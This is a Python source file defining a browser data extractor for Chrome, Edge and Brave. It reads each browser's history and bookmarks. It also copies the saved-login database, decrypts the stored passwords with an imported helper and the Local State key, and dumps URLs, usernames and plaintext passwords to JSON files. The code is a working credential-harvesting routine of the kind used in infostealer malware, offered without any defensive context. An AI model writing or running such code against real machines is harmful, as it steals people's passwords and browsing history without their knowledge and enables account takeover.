import os
import sqlite3
import json
import shutil
from utils import decrypt_passwords


class ChromiumBrowserDataExtractor:
    def __init__(self, browser_name):
        self.browser_name = browser_name
        self.user_profile = os.environ.get("USERPROFILE")
        self.history_path = self.get_history_path()
        self.bookmarks_path = self.get_bookmarks_path()
        self.password_path = self.get_password_path()
        self.local_path = self.get_local_state_path()

    def get_history_path(self):
        # Construct the path to the Chromium history database file
        path_templates = {
            "chrome": f"{self.user_profile}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
            "edge": f"{self.user_profile}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History",
            "brave": f"{self.user_profile}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History",
        }
        return os.path.join(path_templates.get(self.browser_name.lower(), ""))

    def get_bookmarks_path(self):
        path_templates = {
            "chrome": f"{self.user_profile}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks",
            "edge": f"{self.user_profile}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Bookmarks",
            "brave": f"{self.user_profile}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Bookmarks",
        }
        return os.path.join(path_templates.get(self.browser_name.lower(), ""))

    def get_password_path(self):
        path_templates = {
            "chrome": f"{self.user_profile}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
            "edge": f"{self.user_profile}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
            "brave": f"{self.user_profile}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
        }

        return os.path.join(path_templates.get(self.browser_name.lower(), None))

    def get_local_state_path(self):
        path_templates = {
            "chrome": f"{self.user_profile}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
            "edge": f"{self.user_profile}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State",
            "brave": f"{self.user_profile}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
        }

        return os.path.join(path_templates.get(self.browser_name.lower(), None))

    def extract_history(self, output="History_Dump.json"):
        hist_dict = {"history": []}
        if not self.history_path or not os.path.exists(self.history_path):
            print(f"{self.browser_name} History file not found.")
            return

        try:
            conn = sqlite3.connect(self.history_path)
            cursor = conn.cursor()

            query = "SELECT * FROM urls"
            cursor.execute(query)
            history_urls = cursor.fetchall()
            for url in history_urls:
                hist_dict["history"].append({"title": url[2], "url": url[1]})
        except sqlite3.Error as e:
            print(f"Error accessing {self.browser_name} history: {e}")

        finally:
            if conn:
                conn.close()
        # Save history data to a JSON file
        with open("Dump" + "/" + self.browser_name + "_" + output, "w") as json_file:
            json.dump(hist_dict, json_file, indent=2)

    def extract_bookmarks(self, output="Bookmarks_Dump.json"):
        if not self.history_path or not os.path.exists(self.history_path):
            print(f"{self.browser_name} Bookmarks file not found.")
            return
        try:

            with open(self.bookmarks_path, "r", encoding="utf-8") as file:
                bookmarks_data = json.load(file)

        except Exception as e:
            print(f"Error accessing {self.browser_name} bookmarks: {e}")

        with open(
            "Dump" + "/" + self.browser_name + "_" + output, "w", encoding="utf-8"
        ) as fp:
            fp.write(json.dumps(bookmarks_data["roots"]))

    def extract_password(self, output="Password_Dump.json"):
        if not self.password_path or not os.path.exists(self.password_path):
            print(f"{self.browser_name} Password file not found.")
            return
        paswd_dict = {"password": []}

        # making a temp copy since Login Data DB is locked while Chrome is running
        shutil.copy2(self.password_path, "Dump/Login_temp.db")
        conn = sqlite3.connect("Dump/Login_temp.db")
        cursor = conn.cursor()
        try:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins"
            )
            paswds = cursor.fetchall()
            for pswd in paswds:
                paswd_dict["password"].append(
                    {
                        "url": pswd[0],
                        "username": pswd[1],
                        "password": decrypt_passwords(pswd[2], self.local_path),
                    }
                )

        except Exception as e:
            print("Error in Accessing File")

        # Writing to JSON File
        with open(
            "Dump" + "/" + self.browser_name + "_" + output, "w", encoding="utf-8"
        ) as json_file:
            json.dump(paswd_dict, json_file, indent=2)
